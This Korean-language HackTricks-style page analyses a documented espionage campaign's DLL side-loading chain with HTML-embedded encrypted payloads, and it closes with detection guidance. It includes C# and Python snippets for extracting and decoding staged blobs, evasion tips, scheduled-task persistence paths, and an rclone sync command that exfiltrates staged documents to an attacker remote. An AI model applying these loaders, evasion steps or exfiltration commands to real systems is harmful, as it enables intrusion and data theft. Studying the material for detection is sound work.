# HTML 임베디드 페이로드 스테이징을 이용한 고급 DLL Side-Loading

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft 개요

Ashen Lepus(일명 WIRTE)는 DLL sideloading, 스테이징된 HTML 페이로드, 모듈형 .NET 백도어를 연계하는 반복 가능한 패턴을 무기화해 중동 외교 네트워크 내부에 지속적으로 침투했습니다. 이 기법은 다음 요소에 의존하므로 어떤 오퍼레이터든 재사용할 수 있습니다:<sup>[[1]](#references)</sup>

- **아카이브 기반 사회 공학**: 정상 PDF 문서로 위장한 파일이 대상에게 파일 공유 사이트에서 RAR 아카이브를 내려받도록 안내합니다. 아카이브에는 실제 문서 뷰어처럼 보이는 EXE, 신뢰할 수 있는 라이브러리 이름을 딴 악성 DLL(예: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), 미끼용 `Document.pdf`가 포함됩니다.
- **DLL 검색 순서 악용**: 피해자가 EXE를 더블클릭하면 Windows가 현재 디렉터리에서 DLL import를 확인하고, 악성 로더(AshenLoader)가 신뢰할 수 있는 프로세스 안에서 실행됩니다. 동시에 미끼 PDF가 열려 의심을 피합니다.
- **Living-off-the-land 스테이징**: 이후 모든 단계(AshenStager → AshenOrchestrator → 모듈)는 필요할 때까지 디스크에 저장되지 않으며, 무해해 보이는 HTML 응답에 숨겨진 암호화 블롭으로 전달됩니다.

## 다단계 Side-Loading 체인

1. **미끼 EXE → AshenLoader**: EXE가 AshenLoader를 sideloading합니다. AshenLoader는 호스트 recon을 수행하고, AES-CTR로 암호화한 뒤, `token=`, `id=`, `q=`, `auth=` 같은 순환 파라미터에 담아 API처럼 보이는 경로(예: `/api/v2/account`)로 POST합니다.<sup>[[1]](#references)</sup>
2. **HTML 추출**: 클라이언트 IP가 표적 지역으로 지오로케이션되고 `User-Agent`가 implant와 일치할 때만 C2가 다음 단계를 노출해 sandbox의 분석을 방해합니다. 검사가 통과하면 HTTP 본문에 Base64/AES-CTR로 암호화된 AshenStager 페이로드가 담긴 `<headerp>...</headerp>` 블롭이 포함됩니다.
3. **두 번째 sideload**: AshenStager는 `wtsapi32.dll`을 import하는 또 다른 정상 바이너리와 함께 배포됩니다. 바이너리에 주입된 악성 복사본은 추가 HTML을 가져온 뒤, 이번에는 `<article>...</article>`을 추출해 AshenOrchestrator를 복원합니다.
4. **AshenOrchestrator**: Base64 JSON 설정을 디코딩하는 모듈형 .NET 컨트롤러입니다. 설정의 `tg` 및 `au` 필드를 연결하고 해시해 AES 키를 만들며, 이 키로 `xrk`를 복호화합니다. 결과 바이트는 이후 가져오는 모든 모듈 블롭의 XOR 키로 사용됩니다.
5. **모듈 전달**: 각 모듈은 HTML 주석으로 설명되며, 파서를 임의의 태그로 유도해 `<headerp>` 또는 `<article>`만 찾는 정적 규칙을 우회합니다. 모듈에는 지속성 유지(`PR*`), 제거 프로그램(`UN*`), 정찰(`SN`), 화면 캡처(`SCT`), 파일 탐색(`FE`)이 포함됩니다.

### HTML 컨테이너 파싱 패턴

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

방어자가 특정 요소를 차단하거나 제거하더라도, 운영자는 HTML 주석에 표시된 태그만 변경하면 전달을 재개할 수 있습니다.<sup>[[1]](#references)</sup>

### 빠른 추출 도우미 (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## HTML Staging Evasion 유사점

최근 HTML smuggling 연구(Talos)는 HTML 첨부 파일의 `<script>` 블록 안에 Base64 문자열로 숨긴 페이로드를 런타임에 JavaScript로 디코딩하는 방식을 소개합니다.<sup>[[2]](#references)</sup> 같은 기법을 C2 응답에도 재사용할 수 있습니다. 암호화된 blob을 script 태그(또는 다른 DOM 요소) 안에 스테이징하고 AES/XOR 처리 전에 메모리에서 디코딩하면 페이지가 일반 HTML처럼 보입니다. Talos는 script 태그 내부에서 식별자 이름 변경과 Base64/Caesar/AES를 조합한 계층형 난독화도 보여 주는데, 이는 HTML-staged C2 blob에 쉽게 적용할 수 있습니다.<sup>[[2]](#references)</sup> 이후 Talos가 작성한 **hidden text salting** 관련 글도 여기서 참고할 만합니다. 무관한 HTML 주석이나 공백으로 Base64를 분할하기만 해도 브라우저 측 재구성은 간단하게 유지하면서 단순한 regex 추출기를 무력화할 수 있습니다.<sup>[[7]](#references)</sup>

## 최근 변종 참고 사항 (2024-2025)

- Check Point는 2024년에 archive 기반 sideloading을 계속 사용하면서 첫 번째 단계에 `propsys.dll` (stagerx64)을 사용한 WIRTE 캠페인을 관찰했습니다. stager는 Base64 + XOR (키 `53`)로 다음 페이로드를 디코딩하고, 하드코딩된 `User-Agent`로 HTTP 요청을 보내며, HTML 태그 사이에 삽입된 암호화된 blob을 추출합니다. 한 분기에서는 `RtlIpv4StringToAddressA`로 디코딩되는 내장 IP 문자열의 긴 목록에서 스테이지를 재구성한 뒤, 이를 연결해 페이로드 바이트를 만들었습니다.<sup>[[3]](#references)</sup>
- OWN-CERT는 side-loaded `wtsapi32.dll` 드로퍼가 Base64 + TEA로 문자열을 보호하고 DLL 이름 자체를 복호화 키로 사용한 과거 WIRTE 도구를 기록했습니다. 이후 호스트 식별 데이터를 XOR/Base64로 난독화한 다음 C2로 전송했습니다.<sup>[[4]](#references)</sup>

## IP로 인코딩된 스테이지 재구성

WIRTE의 2024년 `propsys.dll` 분기는 다음 PE를 하나의 연속된 HTML blob으로 저장할 필요가 없음을 보여 줍니다. 로더는 점으로 구분된 4개 숫자 형식 문자열로 스테이지 바이트를 저장한 다음 `RtlIpv4StringToAddressA`로 재구성할 수 있습니다. 이는 Hive의 **IPfuscation** 기법과 밀접한 관련이 있습니다.<sup>[[3]](#references)[[5]](#references)</sup> 실제 운용 측면에서 이는 공격자가 HTML 페이지에 명백한 Base64 페이로드 대신 무해한 IOC나 설정 데이터처럼 보이는 내용을 넣고자 할 때 유용합니다.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

복구한 바이트가 `MZ`로 시작한다면, 다음 PE를 직접 재구성했을 가능성이 높습니다. 그렇지 않다면 선행 XOR/Base64 계층이나 주소 사이의 작은 구분자 청크를 확인하세요.

## Swappable DLL Names & Host Rotation

이 패턴의 강점은 **HTML/AES/XOR staging backend는 그대로 유지하면서 sideload pair만 바꿀 수 있다는 점**입니다. WIRTE는 캠페인마다 `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, `propsys.dll`을 번갈아 사용했습니다. 이는 다음과 같은 이유로 유용합니다:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll`과 `wtsapi32.dll`은 흔한 Windows DLL 이름으로, 방어자는 `%System32%` / `%SysWOW64%`에 있을 것으로 예상합니다.
- **HijackLibs**와 같은 공개 카탈로그는 복사된 애플리케이션 디렉터리에서 해당 DLL 이름을 로드하는 바이너리를 다수 이미 매핑해 두었으므로, 운영자는 stager를 재설계하지 않고도 대체 host를 사용할 수 있습니다.
- 각 host에 맞춰야 하는 것은 export surface뿐입니다. HTML parser, AES/XOR routines, module loader는 보통 forwarding proxy DLL에 변경 없이 이식할 수 있습니다.

공격 목적의 실험실 작업에서는 이 문제를 **(1) 선택한 DLL 이름을 로컬에서 찾는 안정적인 서명된 host 찾기**와 **(2) 해당 DLL에서 동일한 staged-HTML loader logic 재사용하기**로 나눌 수 있습니다.

## Crypto & C2 Hardening

- **전면적인 AES-CTR 사용**: 현재 loader는 256-bit key와 nonce(예: `{9a 20 51 98 ...}`)를 포함하며, 복호화 전후에 `msasn1.dll` 같은 문자열을 사용하는 XOR layer를 추가하기도 합니다.<sup>[[1]](#references)</sup>
- **Key material 변형**: 이전 loader는 Base64 + TEA로 내장 문자열을 보호했으며, 복호화 key는 악성 DLL 이름(예: `wtsapi32.dll`)에서 파생했습니다.<sup>[[4]](#references)</sup>
- **인프라 분리 + 하위 도메인 위장**: staging server는 도구별로 분리하고, 다양한 ASN에 호스팅하며, 때로는 정상적으로 보이는 하위 도메인을 앞단에 두어 하나의 stage가 노출되어도 나머지는 드러나지 않도록 합니다.
- **Recon smuggling**: 열거 데이터에는 이제 고가치 앱을 찾기 위한 Program Files 목록이 포함되며, 호스트에서 외부로 전송되기 전에 항상 암호화됩니다.
- **URI 변경**: query parameter와 REST path를 캠페인마다 변경해(`/api/v1/account?token=` → `/api/v2/account?auth=`) 취약한 탐지를 무력화합니다.
- **User-Agent 고정 + 안전한 redirect**: C2 인프라는 정확히 일치하는 UA 문자열에만 응답하며, 그 외에는 정상적인 뉴스/건강 사이트로 redirect해 트래픽에 섞이도록 합니다.
- **제한된 전달**: 서버는 지리적으로 접근을 제한하며 실제 implant에만 응답합니다. 승인되지 않은 클라이언트에는 의심스럽지 않은 HTML을 반환합니다.

## Persistence & Execution Loop

AshenStager는 Windows 유지 관리 작업처럼 위장한 scheduled task를 생성하고 `svchost.exe`를 통해 실행합니다. 예:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

이러한 작업은 부팅 시 또는 일정 간격으로 sideloading chain을 다시 실행하여, AshenOrchestrator가 디스크에 다시 접근하지 않고도 새 module을 요청할 수 있게 합니다.

## Using Benign Sync Clients for Exfiltration

운영자는 전용 module을 통해 외교 문서를 `C:\Users\Public`(모든 사용자가 읽을 수 있고 의심을 덜 받는 위치)에 staging한 다음, 정상적인 [Rclone](https://rclone.org/) 바이너리를 다운로드해 해당 디렉터리를 공격자 저장소와 동기화합니다. Unit42에 따르면 이 공격자가 Rclone을 exfiltration에 사용하는 것이 관찰된 것은 이번이 처음이며, 정상적인 트래픽에 섞이기 위해 합법적인 sync 도구를 악용하는 전반적인 추세와도 일치합니다:<sup>[[1]](#references)</sup>

1. **Stage**: 대상 파일을 `C:\Users\Public\{campaign}\`으로 복사/수집합니다.
2. **Configure**: 공격자가 제어하는 HTTPS endpoint(예: `api.technology-system[.]com`)를 가리키는 Rclone config를 배포합니다.
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`를 실행해 트래픽이 일반적인 cloud backup처럼 보이게 합니다.

Rclone은 정상적인 backup 작업에 널리 사용되므로, 방어자는 비정상적인 실행(새 바이너리, 수상한 remote, 또는 `C:\Users\Public`의 갑작스러운 동기화)에 집중해야 합니다.

## Detection Pivots

- 사용자 쓰기 가능 경로에서 예기치 않게 DLL을 로드하는 **서명된 프로세스**에 경고를 설정합니다(Procmon filters + `Get-ProcessMitigation -Module`). 특히 DLL 이름이 `netutils`, `srvcli`, `dwampi`, `wtsapi32`, `propsys`와 겹치는 경우 주의합니다.<sup>[[6]](#references)</sup>
- **특이한 tag 안에 삽입되거나** `<!-- TAG: <xyz> -->` 주석으로 보호된 대용량 Base64 blob이 있는지 의심스러운 HTTPS 응답을 검사합니다.
- HTML을 먼저 정규화합니다. **Base64 추출 전에 주석을 제거하고 공백을 축약하세요.** hidden-text-salting 방식의 회피 기법은 주석 경계에 걸쳐 payload를 분할할 수 있습니다.
- **`<script>` block 안의 Base64 문자열**도 HTML hunting 대상으로 포함합니다. HTML smuggling 방식으로 staging된 이 문자열은 AES/XOR 처리 전에 JavaScript로 디코딩됩니다.
- **`RtlIpv4StringToAddressA` 호출 후 buffer assembly가 이어지는 패턴**을 탐지합니다. 특히 주변 문자열이 실제 네트워크 대상이 아닌 긴 IPv4 목록인 경우 주의합니다.
- 비서비스 인수를 사용해 `svchost.exe`를 실행하거나 dropper 디렉터리를 가리키는 **scheduled task**를 탐지합니다.
- 정확히 일치하는 `User-Agent` 문자열에만 payload를 반환하고, 그 외에는 정상적인 뉴스/건강 도메인으로 redirect하는 **C2 redirect**를 추적합니다.
- IT에서 관리하는 위치 외부에 나타나는 **Rclone** 바이너리, 새 `rclone.conf` 파일, 또는 `C:\Users\Public` 같은 staging 디렉터리에서 파일을 가져오는 sync 작업을 모니터링합니다.

## References

- [1] [Hamas 연계 Ashen Lepus, 새로운 AshTag malware suite로 중동 외교 기관을 표적으로 삼다](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [태그 사이에 숨겨진 것: HTML smuggling의 회피 기법에 대한 분석](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas 연계 위협 행위자 WIRTE, 중동 작전을 지속하며 파괴적 활동으로 전환](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: 잃어버린 시간을 찾아서](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware, 탐지 회피를 위해 새로운 IPfuscation 기법 배포](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [시스템 경로가 아닌 위치에서의 잠재적 System DLL Sideloading](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [숨겨진 텍스트 salting으로 이메일 위협에 양념 더하기](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
